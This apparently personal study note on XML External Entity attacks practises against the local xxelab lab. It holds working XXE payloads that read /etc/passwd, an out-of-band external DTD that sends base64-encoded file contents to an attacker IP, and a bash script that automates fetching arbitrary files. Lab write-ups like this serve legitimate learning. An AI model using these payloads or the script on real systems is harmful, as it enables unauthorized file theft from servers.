# Definition
Something to do!!
## Installing and Preparing labs
I use [xxelab](https://github.com/jbarone/xxelab) to practice with this vulnerability.
```shell
git clone https://github.com/jbarone/xxelab.git
cd xxelab
docker build -t xxelab .
docker run -it --rm -p 127.0.0.1:5000:80 xxelab
```
___
Open the web using *http://localhost:5000*
![[Pasted image 20230711151257.png]]
___
# Attacking
## Understanding
First we could intercept the *Create Account* action using [[BurpSuite]].
![[Pasted image 20230711151717.png]]
First, you can see that request sent uses [[XML]] to transport form data.
___
### Verifying XXE Vulnerability
Now, let's verify if XXE vulnerability is enable.
In *Repeater* section of [[BurpSuite]] we are going to declare and use a Entity.
![[Pasted image 20230711153003.png]]
___
Now we could retrieve the list of hashed passwords by using [[Wrappers]], in this case *file* wrapper.
![[Pasted image 20230711153407.png]]
___
Another wrapper to do the same is using php.
```xml
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=//etc/passwd">]>
```
___
### XXE OOD (Out of Bind) - External DTD
Sometimes the output of XML request doesn't show anything. So, in that case we are in XXE OOD case.
But, we could use External DTD files to retrieve sensitive information.
First, we should create a server to receive conections from the victim.
```shell
sudo python3 -m http.server 80
```
___
Then, in the XML content we should write this with the attacker IP.
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.200.128/xxe.dtd"> %xxe;]>
```
___
We must define *xxe.dtd* file from the attacker to **inject** entities and retrieve sensitive information.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.200.128/?file=%file;'>">
%eval;
%exfil;
```
___
Now, with python server running and sending XML request you should see something like this.
![[Pasted image 20230711161247.png]]
___
### Automatization With Bash
With the content of the request, we could use a bash script to automatize the process.
```bash
#!/bin/bash

echo -ne "\n[+] Enter file to retrieve: " && read -r filePath

# entity injection
xxe_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$filePath\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.200.128/?file=%file;'>\">
%eval;
%exfil;
"""

echo $xxe_dtd > ./xxe.dtd

python3 -m http.server 80 &>response &
PID=$!

sleep 1

# do POST request retrieving connection to attacker
curl -s -X POST "http://127.0.0.1:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.200.128/xxe.dtd"> %xxe;]>
		<root><name>test</name><tel>123123</tel><email>cxnsxle@cxnsxle.com</email><password>cxnsxle123</password></root>'

# response filter and decode
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

# brute kill of http server
kill -9 $PID
wait $PID 2>/dev/null

rm -f response 2>/dev/null

```
___